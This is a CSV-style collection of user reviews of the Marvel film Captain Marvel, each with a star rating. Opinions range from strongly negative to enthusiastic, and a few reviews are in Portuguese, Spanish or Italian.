Brie Larson is so one dimensional. She seems like the typical non humorous robot people our society produces now and she carries that into her acting. The plot was dumb...the Kree/Skrull war was more like Skrulls running scared than the Enemy Mine hatred they have for each other in the comics. The best part is being in the shoes of the Kree in the beginning with Ronin on your side fighting. Other than that Brie's acting was a big fate disappointment. Marvel missed the mark in this one.,0.5
"Naw, when a movie becomes heavy in political attitude its not worth watching. I watched it. Regretted it.",0.5
"I've recently started watching all the Marvel films in timeline order and this is the 2nd one on the list. Samuel L Jackson was great as Nick Fury and Brie Larson is a good actress but I just couldn't get into this film. I'm a fan of superhero movies and the Marvel movies but this one was very longwinded and boring. The actors in the film were all good but the story was not, it seemed to lack that ""marvel magic"". It passed the time but I wont be watching again and again like I have with other superhero and Marvel movies.",2.5
Literally a complete waste of Carol Danvers. An awesome character played awfully in a messy and condescending film.,0.5
Is very not original very weird vibe,0.5
HORRIBLE MOVIE!!!!...._,0.5
I tried to be subjective and find redeeming qualities in this movie but it is so boring. It plays like it was was written by a kid trying to act smart.,2
"There is a lot to learn still from ancient scripts and plays. When the computer is more important than human creativity, which cleary needs time, trial and error and will never be perfect, this is the result. I remember script session, they were months long, then you went into pre-production. And I am talking script, draft no 39. So many years before the story was born, then nurtured, and now had reached its maturity so we would consider a shoot. These days movies are produced like video games, latter are also getting worst. No story, no intellectual thought, just statement after statement and senseless action. Remember how Hitchcock could make you move with only one sound?",0.5
"Marvel gives audiences a powerful lead woman for the first time since its film series debut in 2008. After many powerful female supporting roles from Black Widow (Scarlett Johansson), Wanda (Elizabeth Olsen), Gamora (Vanessa Marshall), and more, the MCU has finally introduced a movie with a female lead. Captain Marvel's origin story is very interesting and the 90s vibe throughout the film is lovely. Samuel L. Jackson as Larson's supporting role does phenomenal and the film proves he needs more screen time in the future.",4
"Some issues: 1. Uncharismatic, lifeless lead. One could say it's part of the plot and totally ""in character"" but that doesn't change the fact that she is boring. 2. Boringly overpowered main character. There's a reason why kryptonite exists. It's about the only way to introduce any suspense to a Superman story - and still, it's tough to tell a Superman story without a similarly overpowered monster/villain. There's a reason why the best Thor movie is the one wherein he loses his hammer and doesn't even personally defeat the enemy. 3. Uncompelling, easily-dispatched big bad. A direct result of having such an overpowered protagonist and exacerbated by pitting them against a much weaker antagonist. That's why you end up with such an anticlimactic final battle with zero stakes. Other than that, good idea to cash in on nostalgia by setting the movie when they did. Great to have a female-led MCU movie, nice introduction to Kree and Skrulls that could potentially be explored further in later movies/storylines, a de-aged Samuel L. Jackson (despite moving like an old man) is not bad, and there was a ton of great acting from all the other characters/actors.",2
It's a disaster of a movie that is horribly written and has no good redeeming qualities. A waste of time is an understatement.,0.5
I like the action and it had some good scenes.,3.5
Shallow. No character development,0.5
"Horrible movie. Nothing interesting about the main character. Destroys several plot-lines from the actual good marvel films. Changing the main character's gender for more audience support is also weak. Oh, and Nick Fury's line about his eye makes absolutely no sense now. DO NOT WATCH THIS UNLESS YOU ARE PREPARED TO MOCK IT.",0.5
"I think all of the other ratings are pure sexism. Captain Marvel is probably one of my top 10 favorite Marvel films. It had the right amount of action and comedy that every Marvel movie usually has. I liked the backstory of Carol Danvers, it was interesting, I liked the theme of the movie and the time period it was in. I LOVE the blockbuster scene, it was enjoyable for someone who grew up with blockbuster and grew up with a family that went to blockbuster A LOT. I liked the Nirvana mentions, those were enjoyable, being a fan of Nirvana myself. Overall, I think everyone should watch the Captain Marvel movie, super excited for the second one!! Cannot wait to see where they take her character and any other character they bring in.",5
"Dissapointing for a Marvel movie. Brie Larsons acting is terrible, unless Captain Marvel is supposed to be emotionless robot.",2
A wholly unnecessary prequel movie that only serves to shoe-in a new hero that is barely in the avengers films anyway. The film has its moments.... but those are usually moments that dont include captain marvel herself.,2
One of the worst marvel movies. Lots of plotholes. At least it's fun...,3
Poor character development. Unrealistic arcs. Forced. Rushed. Time I can never get back. This movie is the moment I lost faith in Marvel movies and why I wait for them to hit DVD now.,0.5
What even is this trash of a movie? Brie's performance was flat when compared to Infinity War and Endgame. The action sequences are dead boring and the plot feels like a whole bunch of BS.,1
"√â diferente de v√°rios filmes de super her√≥i, n√£o teve luta contra um imponente vil√£o no final, os atores s√£o √≥timos, principalmente a Brianne Larson, mas o roteiro pecou muito. A HQ ""A Vida Da Capit√£ Marvel"" veio pouco tempo antes do filme para endireitar com o filme, mas conseguiu sair tudo diferente e ambas as hist√≥rias s√≥ combinam em mudar a origem da personagem.",2
"Alright! In all honesty, I don't see why audiences hate Captain Marvel a lot. I thought it was an amazing female superhero movie.",4
"This movie is likely the worst of the MCU. The acting from Larson was wooden, the plot made little sense, and much of the dialogue had me cringing in my seat. The character of Nick Fury in Captain Marvel is wholly inconsistent with what the MCU has established for him. The action and the fight scenes were decent, and that is probably the only partially redeeming quality of this movie.",1.5
"I genuinely expected more from the Captain Marvel character, cause after The Infinity war she was built up as the game-changer. She really wasn't, but they're stuff I can get behind & stuff they failed at. One of those is what happens to Nick Fury's eye. I expected better because of a comment he makes about it in an Avenger's movie",3
WORST marvel movie of all time. Critics giving it a thumbs up?? please. SO boring and lame. Wonderwoman is way way better,1
Despite the common opinion it's a good movie. It is definitely flawed but still very good. The lead is kinda boring but the action is enjoyable and getting to learn more about Nick Fury and see Agent Coulson is a treat. It has an intriguing story with some phenomenal world building. Goose is adorable and the references are great. It's a fun watch overall.,3.5
Clearly Marvels attempt to compete with DC's far superior WonderWoman. Waste of time and money. Thanks a lot Marvel,1
The movie was very boring and the movie's plot twist was very predictable.,0.5

"I really tried to enjoy this movie but it was so boring, I almost felt sleep a lot of times. It has 1-2 interesting concepts but that's it.",0.5
"I have always had a negative opinion of this film. However, upon watching it a second time, I realised I vastly underestimated it. This movie blows many others in the MCU out of the water, including the first thor films and many others. The main issue I see is that marvel introduced Captain Marvel late in the game (as well as the sexism that arises from a strong female character). After all the rhetoric I had seen about marvels cockiness, I had expected her to be unbearable. But while watching, all I saw was a person who had been taught her whole remembered life that the people on earth were below her and that she was a powerful soldier defending her planet. Not only was her attitude understandable, I found it enjoyable and watching her not stand for injustices thrown her way was refreshing and welcome. Overall, I think this movie was great, and while there may be valid criticisms, a 2.3 score is ridiculous and shows how many marvel fans view the first female based superhero film.",5
"Oof, Captain Marvel is awful. The lead character is bland, the action is forgettable, it opens up new inconsistencies in the timeline, they turn Nick Fury into a joke, and it just was at the end of the day mediocre at best. I don't understand how one can call this a great movie.",1.5
"This movie was pointless. Putting aside the terrible person that is Larson, the movie just fell flat and forced. The cat was maybe the best part and that is not a good thing. They need to can this movie, character, and whoever wrote it/directed it. I will not watch a sequel if made.",0.5

I'm not sure how or why this got so many high scores from critics this is one of Marvel's dumbest movies in my opinion at least plot-wise there was so many plot holes that is started to give me a headache like a patch stopping her powers because she didn't believe or something like that also this movie made Nick Fury line in Avengers week the Kree and the scroll are now extremely incompetent ECT. This movie honestly suffers from plot stupidity,2

Worst marvel movie so far .,0.5
One of the worst movie I've seen was boring and unoriginal,0.5
"I enjoyed parts of the movie but for the most part it's just Brie Larson being the most wooden character in MCU history, she needed to be more diverse instead of 3 emotions, Anger, Happy, and Rebel, which can work for a Character if written well. The main issue comes with the fact that we know as much as Carol Danvers about who she is, which on paper sounds like a great idea, but doesn't translate well to screen. But the biggest crime is how they made Nick fury lose his eye to a cat, all for the sake of a joke nobody laughed at",2

Its not as bad as everyone says Must watch it. An overall good film,5
"Uhm...What the hell was this ? Don't waste your time with this regardless if you are an MCU fan or looking for a female action film ... Poor direction, poor acting and script is atrocious.

It was a long time coming but this is the Femal led super-hero movie I think many of us were waiting for. It was an exciting addition to the Marvel universe and added depth to characters we've seen before. It also sets up possible story avenues that with a new light.,4
"Worse Marvel movie so far - I didn't like how Brie Larson acted - at the beginning of the movie she is described as ""hot tempered"" but there is not a single moment where this aspect is seen (probably the script didn't help), she is strong - and quite boring - from the beginning to the end of the movie.",1
The score was bad during the fight scene. It got on my nerve. The acting was so so bad and Brie Larson did not fit the role of Captain Marvel,0.5
"I saw this movie in theaters, and I can't say that it was my favorite Marvel movie, but it sticks to the MCU formula well enough to produce another solid one. This movie is on par with the MCU as a whole, which gives this movie the extra boost that it needs to stay fresh. Otherwise, this movie wouldn't be very good at all. The comedy is pretty good, exactly what you've come to expect form Marvel. The characters in this movie were rather a mixed bag for me, for the protagonist in particular, I'll get to that in a moment. I genuinely enjoyed watching most of the characters though, some are far more rounded than others. The story is plain enough and adds just enough nostalgia from past MCU movies to keep true fans invested. Causal viewers will be pleased the most with your typical third act CGI-fest. I was rather disappointed with how Marvel handled the character Captain Marvel. I understand that the directors adapted her just as she is in the comics, that isn't my main gripe. I'm more concerned with her lack of character development. Throughout the movie, Carol Danvers', played by Brie Larson, has some compelling motivation is to prove wrong all of her doubters as one strong female lead ought to and this was a large victory for empowering women everywhere, but... why doesn't her character change by the time that the film is over? At the beginning of the movie, she's kicking butt, getting up when she's thrown down, and trying to remember who she is because she's been brainwashed by the twist villain. At the end of the movie, she's kicking more butt, getting up when she's thrown down, and remembers enough of her past to take down the twist villain. Yet she doesn't learn anything about herself. She keeps doing what she's always done. Carol Danvers doesn't go through any emotional or internal character arc, which absolutely shocked me given Marvel's Oscar-worthy demonstration of story telling in Black Panther. If I'm being completely honest, I felt short-changed, Captain Marvel deserved better than this. I understand that Captain Marvel is a hard character to adapt to the big-screen, in terms of personality and the extreme level of her cosmic powers, but I've come to expect so much from Marvel that I was disappointed. If you have enjoyed MCU films thus far, you will find this one to be a hit as well. Despite an unfortunately shallow protagonist, this movie manages to rise above that problem to become an average MCU film.",3.5
"I fell asleep watching this movie on several separate attempts at watching it. Either multiple postmates workers slipped me sedatives, or this blows.",0.5
Like the character. Didn't like the storyline.,1

Capit√£ Marvel √© uma tentativa fracassada da Marvel Studios em criar diversidade. Mas s√≥ conseguiu criar um filme for√ßado.,2
The weakest marvel movie of the whole bunch. The main actress is bad and not relatable,0.5
"CAPTAIN MARVEL was pretty meh and uneventful. Mid-tier Marvel movie and when comparing female superhero's, I actually give DC the advantage thus far with WONDER WOMAN over this. The 90's nostalgia was overdone and was trying too hard to be cool and retro. Soundtrack at times felt out of place.",3
Soulless and lifeless. Disappointing. The writers and directors had an amazing opportunity to showcase a bit of MCU backstory but they completely bungled it.,0.5
"Great storyline! I love Brie Larson, too! My favorite part about this movie is that it focuses on emotional challenges while still including the classic Marvel action. Samuel L. Jackson, Jude Law and Lashana Lynch are GOLD!",5
"Ugh. This is my least favorite marvel movie. Sam Jackson was it's only saving grace, and not even he could come close to it's salvation. The characters are cookie cutters, bland boring and forgettable. The action wasn't that thrilling, it was so slow paced, and any attempt at comedy fell so flat. They explain how Nick Fury lost his eye in this movie, and I hate it to my very core. That should not have happened. I don't care if it was comic book accurate, it was stupid. But, this movie's biggest problem is the title charterer herself. BIG emphasis on the HER. Because the only thing Captain Marvel has in this movie is she is a powerful, strong female. I have seen more personality in a paper clip. That's not entirely the actresses fault, Captain Marvel is just not an interesting character. Period. I have hated this movie for a while, but I could never figure out why. (Minus Nick Fury's loss of an eye) But today, I finally figured it out. This movie represents every over played, female empowerment Hollywood cliche that draws attention to a girl who was a hero, not a hero who was a girl.* There is a difference. A character should be likable, have a personality, you want to see them succeeded. The movie, however, was so focused on making her an icon for 5 year old girls that they forgot to make her a character, and that's what I hate. I hate bland pieces of bread focused on saying ""girls rule"" without anything interesting behind it. Even worse, this studio gave us some of my favorite hero girls, from Scarlet Witch to Gamora to Black Widow. I hope Marvel can get back on there female game with Black Widow, because on my next re-watch, I'm skipping this uninspired mess that they call an MCU movie. *Nostalgia Critic said it first in a Kim Possible review. It was a really good phrase so I used it.",2
"A superhero movie that's not mainly about being a superhero, and once you accept that it's way easier to appreciate this film for what it is: At its heart, Captain Marvel is an action-mystery (in the vein of The DaVinci Code, or maybe Bourne) about friendship, family, justice, and kick-ass women. And a not-cat named Goose, of course. There are some gripes about shoehorning this retroactively into the MCU that can't really be blamed on this movie (I guess the events of Avengers 1 don't count as an emergency?). SLJ and Larson play together fabulously. Carol Danvers takes no bullshit and I'm here for it. 5 flerken (flerkens??) out of 5.",5
Too boring & Clich√©d.,1.5
DON'T CARE WHAT ANYONE SAYS! I love this movie and Brie Larson is perfect! Can't wait for CM 2!,5
"Protagonist without charisma, mediocre villains, this film is perhaps the worst that marvel studios has done",0.5
This is a likeable addition to The Marvel Cinematic Universe in what was to become the final solo entry before the much awaited End Game. The film centres on Captain Marvel discovering who she was and who she is to become to establish her place in the Universe. We see Nick Fury ( Samuel L Jackson ) take a central role in this film based in the 1990's and discover his development into Head of Shield operations. The film suffers a little pacing issue as the first quarter of the film is a little slow to tell us who Captain Marvel was and unfortunately relies very heavily on cgi ( that quickly dates ) at the end of the film. That said the feel of the 90's is achieved perfectly particularly with original video's on display in Blockbuster and once we realise Captain Marvel was originally an abducted earthing the film takes a new turn and the film picks up the pace perfectly. A fun movie with some good moments that in the end links us to Nick Fury at the end of Avengers Infinity War.,3.5
"This movie is a great example of a BAD superhero movie, i didnt feel in all the movie that the main character was in danger, didnt see evolution, didnt learn a lesson... nothing is just an empty movie that tells us ""look how strong is captain marvel"". And the only script twist that you can have is ruined because de ""good ones"" that turn to be the bad ones are the bad ones of another movie. The only reason for me to put 1 star instead of half to this movie is the apereance of agent Coulson",1
average MCU movie didnt like it.,2
"shes absolutely badass. if you hate her you are a real misogynist. it had great story line and an amazing plot. she is the most powerful avenger because she's had years of practice. she's not cocky, she's tied to the roll just like anyone else. great movie and i hope to see more of her.",5
"Not a bad movie, but just kinda average. Compared to other Marvel movies this one lacks action, comedy and emotion. It‚Äôs hard to really like the Captain Marvel character when she was pretty much just shoved in our faces and said ‚Äúok here‚Äôs the future and she‚Äôs the strongest.‚Äù Samuel Jackson was really good in his role.",3
"I personally found her performance to be extremely hollow and in my opinion, the character had little to no redeeming qualities.",0.5
The usually reliable Marvel Studio shows that they can drop a clanger. Brie Larson displays almost no emotion in what is just a bad re-write of The First Avenger. Terrible in almost every way. Half a star for some cool effects and half-hearted eighties nostalgia.,0.5
"I really loved this movie. It really showed ""girl power"" and it is just a great story and really witty.",5
many bash this movie for no reason at all besides misogyny. believe me i use to be one of those people. but when you put aside your bitterness and watch with an open mind you find a great movie with great actors. i love marvel and this is another win for them! can‚Äôt wait for captain marvel 2!,5
A very bland movie without a character that can be rooted for. The lack of story depth proved the theory of Marvel only relying action spectacles to sell their movies.,0.5
This movie is a worse meh moment than The Emoji Movie. It is also absolute cringe. üò¨,0.5
It was alright for the later half. But something about this movie doesn't click with me like the rest of the marvel movies. I feel like it was way to confusing at times. I do hope to see Captain marvel in the future. Her character has potential,2
"Un film che fa il suo lavoro ma per nulla memorabile, utile solo per capire il collegamento con Endgame.",2
"This movie was awful. Story line was forced. Acting by lead was terrible. It added absolutely nothing to the Marvel series. I fell dumber for having watched it. This movie was strictly a ""girl power"" insertion into Marvel Series. Do not waste your time watching it. It would be better spent watching Howard the Duck",0.5
"Had some decent special effects and played a small role in moving the MCU/Thanos ball down the field. But overall, it was contrived, incoherent gibberish of a plot. Carol Danvers was presented as a Daisy Ridley/Rey-type character who has no flaws, limitless power, and someone who‚Äôs biggest threat is the misogynist, man-splaining, patriarchy. Couple that with the real-world douchebaggery of Brie Larson, and you have an unlikeable ‚Äúsuperhero‚Äù who is played by an actress who most of the audience can‚Äôt stand. Wonder Woman was much better, and while it had its own flaws, they at least had a character, plot, and actress you could like, enjoy, and respect. Skip this movie if you haven‚Äôt already seen it.",1
"I had my reservations about Captain Marvel after joining the Marvel franchise late but I will say I was utterly impressed. She had a great plot, a nice character arch, a good bit of action, and a sense of comedic relief. It was also great to finally understand Fury's backstory.",5
I for one did not hate the movie as much as many others seemed to though I will admit giving your lead character amnesia and forcing them to show no emotion makes them fairly dull.,4
"It was ok, kinda underwhelming, especially when she hardly appeared in endgame.",2.5
"Extremely boring, formulaic and uninteresting. Brie Larson gave a terrible performance and shows she is not fit for this role.",1
I really liked this movie. It has a powerful charismatic performances. I like Brie in the movie. I thought she was super. The story and action was great.,5
10/10 love Brie in this role,5
This movie was amazing; a feminist icon.,5
"La pel√≠cula no es tan mala como muchos dicen, simplemente que el personaje es demasiado poderoso, y sabes que no hay forma de que pierda, lo que hace a la pel√≠cula algo aburrida, el ""Villano"" Talos, no es est√° mal, Brie Larson se siente algo seca en su interpretaci√≥n, aunque le queda bien al personaje, aunque su forma narrativa, en la que tu vas descubriendo el pasado de Carol al mismo tiempo que ella, est√° bastante interesante",3.5
Terrible choice for Captain Marvel and not the best way of showing a proper ‚ÄòStrongest of all time' hero. I would hope that Marvel doesn't ride Captain Marvel into future phases cause boy oh boy! Is that ship gonna sink haardd!!,1
"All things considered it was an enjoyable movie. Was it as good, or as rewatchable as Iron Man? Not close. Was it as bad as Hulk? Not close. Personally I'd put it in the bottom half of the MCU movies. So why the four stars? Well just because it's not the best MCU movie, it was still a good movie. Maybe if it had been released back in phase 1 of the MCU instead of phase 3. I definitely look forward to CM2.",4
"This movie gets so much unnecessary hate. The only real reason I can think of is to why is pure misogyny. Captain Marvel is in no way pushing and agenda or just a ""girl power"" movie. It is just as action packed, funny, and campy as any other marvel movie is. This is a must watch in the franchise.",4.5
"Though the movie is far from the MCU's best, esspetally when you conceder the fact that it was smushed in between two masterpieces. this movies still gets an unfair amount of hate thrown at it. much like the Star Wars sequel trilogy, this movie is an unfortunate victim of sexist internet trolls who bash the movie for having a strong female protagonist. but the good people all understand that this movie is an overall ok movie with just enough action to keep real fans entertained,",3
"It's not the best MCU film but I'm gonna recommend it for it's humor,performances and some action scenes.",3.5
"Captain Marvel represents everything wrong with Hollywood and movies in general these days. It seems to want to push a political agenda more so then entertain fans. Brie Larson is just as unlikable in the film as she is in real life. I love Samuel L Jackson as a person and as an actor, but he's not the Nick Fury I grew up reading about in the comics, especially his portrayal in this film. He's reduced to a bumbling idiot along with half the other male actors for the sake of making Carol looks like a stronger character and it just doesn't work. Also in the comics Monica Rambeau was Captain Marvel decades before Carol Danvers yet in this film she's reduced to a secondary side character to staggering unpopular one. I'm all for female empowerment but when it's done correctly like in Buffy The Vampire Slayer, Alien, Underworld, Resident Evil, Wonder Woman, etc. Basically movies that empower females without turning all other male leads into bumbling idiots, unlike this one. I also really don't get why Marvel is turning popular white characters black instead of just using popular black characters. It's as if they think original black characters can't and won't work on film of something, which is extremely insulting to say the least. The film really would've been better off focusing on Monica Rambeau as Captain Marvel. There are some positive elements of this film but not enough to subvert the giant slap in the face to fans of the source material.",0.5
new and fun family film,4
"Completely bland and lacking of inspiration. Marvel really could have done something amazing with this movies, but instead messed up at nearly every step of the way. Massive disappointment.",1.5
"This film is a disgrace to all the other movies MARVEL has released and I deeply dislike it with a passion. I didn't even care to go to a cinema to see it and waited to rent it as cheaply as I could instead. The first movie about a female character should have been about BLACK WIDOW and her dark past. Especially since she dies on the next movie. Scarlett Johanson is a charismatic character and Black Widow is just AMAZING. Captain Marvel lacks charisma and her morality is questionable (she beats up a guy and mugs him just because he hit on her, like- what type of hero does that?!) and she is op. There are many plot holes, plot armors and conveniences. Also I can't believe that they emasculated NICK FURY! HOW DARE THEY SHOW US THAT A CAT SCRATCHED HIS EYE OUT? THAT IS DISRESPECTFUL TO ONE OF THE MOST MYSTERIOUS AND COOL CHARACTERS EVER?",0.5
"A good movie, good visual effects, i loved Carol Danvers/Vers and Nick Fury, one thing that could be better imo was a real villain. I recommend.",4.5
"CAPTAIN MARVEL is a really fun movie that I love. However, it may take a while for Brie Larson to fully get both feet on the ground with the Carol Danvers character. But hey, it took Chris Hemsworth 5 films and almost 7 years to become outstanding as Thor.",4
Not the best MCU movie. Stunning visuals. Nice origin movie.,3.5
best origin mcu movie,5
GOD THIS MOVIE WAS AWFUL,0.5
best mcu movie best origin story brie larson is brielliant,5
"Attitude problem, over powered, inconsistent, ...that's basically it.",0.5
"When this was made it was the worst MCU movie made to date. Thank goodness Marvel made Endgame which they raised the disappointment bar to new heights. There was no character development, and I mean at all. The future Captain went from great to great and never had to look inside herself for any retrospective, never had a worthy opponent which all equals boring. It's so sad since introducing a new superhero is where MCU excelled in the previous heroes.",2
Pretty colors. Not much else going for it.,1.5
Horrible. Boring. Can no one write exciting movies any longer? I don't know who Brie Larson is this is the first time I seen her but her acting is horrible.,1
"excellent film, the plot is super tied, the story is not told in a linear way and this ends up helping in the construction and development of the protagonist. The interaction with the other characters in the film occurs naturally. and in the end it's a good movie.",5
"Ohh, what a bland run of the mill and boring marvel movie. This has to be the worst marvel flick i have watched and i have watched plenty marvel flicks. Brie Larson in many scenes feels wooden, uninspiring. You have got to realize how bad a movie is if the most memorable scene involves a freakish cat rather than any of the main characters of the movie. The story feels so lazy and done to death like thousands of times. And bad screenplay does it no favor either. As for acting, Jackson as usual was the shining star and Ben Mendelsohn has done surprisingly well considering heavy makeup he had to wear but most others fail to even register their presence as actors. No disrespect towards their efforts though. The dialogues weren't memorable either. Now most marvel movies aren't really known for powerful acting or dialogues but they still have a decent mix of screenplay, action CGI and bit of comedy, which provides great entertainment quotient to it making them enjoyable, but this one failed spectacularly even in that department. Arguable the worst MCU movie.",0.5
Terrible movie. Brie Larson can't act.,0.5
Loved it. Soundtrack was amazing and the lead was kick ass! Overall a great movie that I highly recommend.,4.5
"boring narrative, cliche storyline, nothing excited or interesting, fight scenes???",0.5
"It was okay, but certainly one of the weaker Marvel movies. There just wasn't anything that as overly good about it. I would say see it with minimal expectations.",3
"On a scale of fail to failure, I would give this a massive flop. So much for woman power and rights when the creators can't think of something new and fresh without comanderring other works.",0.5
BRIE LARSON WAS BRIELLIANT IN THIS MOVIE OSCAR WINNER SO NO SURPRISE THIS MOVIE GETS BETTER EACH TIME I WATCH IT,5
"First of all, as a woman, I don't really see this as a feminist movie, rather a movie for women who see themselves over men. That is NOT what equality means, men AND woman should be at the same level‚Äîand Captain Marvel was just an example of such a feminist movie. Okay so I have a few issues with this movie, the first being: she has too much power, that it doesn't even need to be a fight. So I understand that Captain Marvel is SUPER powerful (as I've read the comics) but seriously, so goes into a spaceship, kills everyone and manages to destroy the ship WHILE being handcuffed? Marvel has a way of being unrealistic but that just proves it all. Second: this feels like every other Marvel movie I've seen. Don't get me working I love marvel, but when it comes to doing things differently, they ain't it. DC maybe has bad movies but you can see them doing different things at least. Captain Marvel just reminds me of Thor:Ragnarok, Black Phanter and most of the avenger movies. Nothing different. Third: I don't really know if it is Brie Larson or generally just the script, but they are making her out to be emotionless, in WHICH i know that was the main idea of the movie. But it is really upsetting that she doesn't change her emotions in the last fight, her face is completely still while the dude is off screaming and showing emotions. Last time I checked, it was the dud who told her to not use her emotions. They got that really messed up. Overall they did have a good plot, but they didn't manage to do it right. Feels to me that they put it out there just to say ‚ÄòYou won't understand Endgame if you don't watch this movie' Compared to Wonder Woman this movie was absolute thrash.",0.5
"My thoughts on this movie? It sucks... Not really, it's okay, not amazing like some people say, and not the worst movie I have ever seen. It's in the middle somewhere. There are things in this movie that are different from the comics. Some are the dumbest decisions made. Some wouldn't make a difference if they were the same as the comics and some are just; well they seem forced. The Feminist message is okay, sort of. Way less of a problem but there are some choices in the movie... Let's just say Wonder woman does the Female Hero thing a bit better. Then there are the villains of the movie, no spoilers but they aren't great either. Is the movie great? No. Is it terrible? No. It's almost the middle of the road.",2
"Very bad movie, save your time and dont watch it!",0.5
I really enjoyed this movie. Great special effects and a good story.,3.5
"This is a movie. It has a weak plot, bad acting, biggest eye rolls ever, it's terrible, but it has a start/middle/end. So, it's not a complete dumpster fire that makes barely any sense like Star Wars Episode 9, but it's right there at the bottom with Thor 2 and Incredible Hulk",0.5
"It wasnt worth watching, very political",1
Captain Marvel adds nothing new to the MCU. Just another MCU movie who's only unique quality is that it is the first female lead superhero movie set in the MCU.,0.5
Typical superhero film.,3
It was more annoying than entertaining. Could have been been casted a lot better.,1.5
"Miscast, annoying forgettable",1
"I wouldn't watch this movie again, but it wasn't offensive or particularly scandalous, just meh üòï",2
"Bland and forgettable, mediocre in many levels",1.5
the CGI used on Samuel L. Jackson and Clark Gregg to make them look younger looks outstanding so overall this is a fun movie that gives more backstory on the Tesseract and has an excellent cast with Ben Mendehlson and Jude Law added.,3.5
"oof, that was rotten... hope to see something more of matter in next movie.. from marvel..",0.5
"The main hero of the story never had to really try to win. There was no real conflict that the main character had to over due to her OP plot armor. She got her powers from an alien trying to build a light speed engine but..... they already had light speed, or faster, engines because they were traveling to different galaxies in no time. Poorly written and cringey.",0.5
"It was fine the first time I watched it, and I'm a huge MCU fan, so of course I watched it multiple times. It gets worse every time I watch it. It's boring, bland and feels slow in pacing...",2
"This is such a fun, action film with a positive portrayals of women heroes. Our family has watched it multiple times. I'm surprised at the negative reviews. This is not like the more typical male-focused hero movies. It has lots of call-outs to the power of women's camaraderie and strength. This is an important movie for girls and women, and hopefully more movies like this will follow.",5
Huge dud considering the mountain of quality Marvel content it was built upon.,1.5
"While the leads performance was dull and stoic, I rather enjoyed the color schemes, the concept and culture of Kree, and their ominous Supreme Intelligence leader/leaders? As is missing in many marvel movies, I'd appreciate a more thorough pseudoscientific explanation of how her powers work, just what exactly she can do with them besides generic blasts and expulsion force to make her fly. I want to know if she ages differently, if she needs food, if she runs out of energy etc. lots of style and little substance beside nostalgia.",4
"Captain Marvel as a story makes very little sense, worse it makes even less sense within the MCU. Why include Nick Fury if his knowledge of Captain Marvel makes all his subsequent decisions deranged? Did the director not watch any of the other movies in the show they were hired to direct? Problems with the MCU aside, Captain Marvel makes no sense on its own either. As a super hero origin story there is no real adversity, no failure. Captain Marvel can immediately do everthing she needs to, when she needs to. And as a story. There's so much wrong. Deus ex machina. Also, the Skree are bad right? They're persecuting the Skrull (who are more evil because they look evil?). Or something is chasing them into other star systems anyway. So when Captain Marvel gleefully destroys the last Skrull ships she's really laughing whilst she kills a bunch of refugees. I dunno, I don't get this movie's story or it's message.",0.5
"I unironically forgot about this movie and what happened in it, which kind of just reflects the movie in general. A forgettable bore, I only watched it once cause it was just so blah. Like you can't get attached to the movie or anyone in the move cause the main character is so blahhhhhhhhhhhhh. It's kind of like thor but at least chris hemsworth had some charisma. Basically the plot is CM goes to earth and has memories on earth so she teams up with Nick fury to find her memories and things happen. The main character and villian are so bland and boring it makes any hope of finding this movie enjoyable, interesting, or something you can invest yourself in impossible cause your to bored to care.",2
"Captain Marvel may be a safe superhero origin film that provides expected action and humor... But regardless, it's still a satisfying entry in the MCU carried by an effortless star turn from Brie Larson. There is so much set up in this movie with a greater picture coming into the future with the MCU. Maybe in the future this film will feel more important after we see the set up in action that this entry originates.",2
"It was an ok Marvel movie... It did not reinvent the film industry, it did not push boundaries, it just gave us an overpowered character that was meant to be the paragon of modern feminism. Needless to say, it fell flat on its face doing that, especially since Wonder Woman was in the cinema months earlier.... which is so infuriating to see how the critics praised so much based on ""feminism"" alone. Compare it with Alita Battle Angle, a much better movie with a likeable character that also accomplishes to highlight a strong female lead without beating you over your head with it. But since Disney did Captain Marvel it automatically needs to be hailed as revolutionary..... no....",2.5
"The movie was awesome! Great CGI, a great hero, and a great story! Watch this one for yourself - ignore the review bombers. ‚úåüèª",5
Not that great yet worth watching,3.5
Ok what you expect out these marvel movies.,3
"I'm not so tempted to be scathing of Captain Marvel as some other folks are, but that isn't to say I'm denying it has faults, more faults than a lot of the other MCU movies. The movie is okay, but it isn't much more than that",3.5
"The visuals are good, but that is nothing new considering the standard for MCU Movies' special effects. It is a movie about an overpowered woman who doesn't even remember her own past. Out of nowhere she goes from a useless girl to a super strong hero? Really? They ruined some elements that could have been great, like the Skrulls. Also, moments like Nick Fury's eye loss, were ruined, once again, by the ""comedy"" touch. Be serious when you have to, please. Forgettable and boring.",3
"It is a good movie if you just want to have fun. But if you're a MARVEL fan, this movie has a lot of incoherences.",3
This movie did a shoddy job adapting the source material. Ruined the villains and turned the heroine to a bland one,1
"Worst of the marvel movies. I¬¥ve seen agents of shield episodes with bether scenario than this. And this Nick Fury was just ""Bad"", clich√™ and booring",0.5
"It's sad that people have misjudged this film because of the large amount of external conflicts with the actress, and such... But the film itself is not bad. It presents a very fun, smooth and interesting plot.",4.5
Brie Larson is so very cringe,3.5
"Extremely boring. No character development, no obstacles to overcome...It just feels as if the main character is going through the story just passing by. It's just things happening in a secuence about which you don't care at all, because there is no emotional attachment, development, there are no stakes...and you never feel any danger or the slightest possibility that the enemies have any chance of winning. Morover the main character is the most unlikable and arrogant character in the story",0.5
T√Å BOM ESSE FILME COSEQUE SE PIOR QUE INCRIVEL HUCK O PONTO MAIS FRACO DESSE FILME E O FLASBACK ESSO NAO FUCIONA AQUI E SERIO ATRIZ NAO TEM NADA AVER COM O PESONAGEM NOS QUADRIOS E NEN A PROPRIA PESONAGEM TEM AVE COM OS QUADRIOS ESSE FILME E O PIOR FILME DA MARVEL,0.5
Found the lack of charisma in the main character to be very distracting.,0.5
"Great looking, pretty movie. Downright Holy plot that either corrupts or entirely breaks at least three other plot lines across the marvel universe. So many things in this movie makes zero sense, and it's so unlike the rest of marvel comics to just throw a bunch of stuff together that doesn't even line up with itself half an hour earlier in the film. The main character (I'll refer to as a plank, due to the literal lack of character) doesn't even get an origin story. There's no power discovery, there's no training montage, there's no stumbling falling, or getting back up (except in flashbacks from BEFORE she got her powers for like 3 full seconds with no context whatsoever). Please watch, just don't think about it.",1.5
It's just so very bland.,1
Didn't like it. ok. U,0.5
You may like or not like Brie but the movie itself is great and fits perfectly into the Marvel Universe. I thought the movie would be crap but now I consider it as one of the best from the franchise.,4.5
Average superhero movie,2.5
this is not one of the best superhero movies but it is also not one of the worst he is average.,3.5
"I think most importantly, this movie did not have any impact on the world, MCU history, or other important characters. It's okay if the acting was good, but Larson's acting was terrible.",0.5
"This movie is a lump of crap. Weird reality in the movie, dumb parts, and very stupid conception. LUMP *clap* OF *clap* CRAP!",0.5
